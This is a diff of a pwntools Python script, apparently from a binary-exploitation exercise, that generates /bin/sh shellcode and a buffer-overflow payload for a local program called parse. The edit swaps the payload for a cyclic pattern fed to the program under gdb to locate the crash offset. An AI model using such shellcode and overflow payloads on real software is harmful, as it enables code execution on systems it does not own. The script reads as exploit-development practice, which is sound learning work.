@@ -13,11 +13,12 @@ shellcode = shellcraft.sh()
 print(shellcode)
 print(hexdump(asm(shellcode)))
 
-payload  = cyclic(cyclic_find(0x0000555555555751))
-payload += p64(0xdeadbeef)
-payload += asm(shellcode)
-
-bash.sendline('/vagrant/parse')
-bash.sendline(payload)
+#payload  = cyclic(cyclic_find(0x0000555555555751))
+payload = cyclic(500)
+#payload += p32(0xdeadbeef)
+#payload += asm(shellcode)
+bash.sendline('echo ' + str(payload) +' > 50')
+bash.sendline('gdb /vagrant/parse')
+bash.sendline('run r < 50')
 bash.interactive()
 
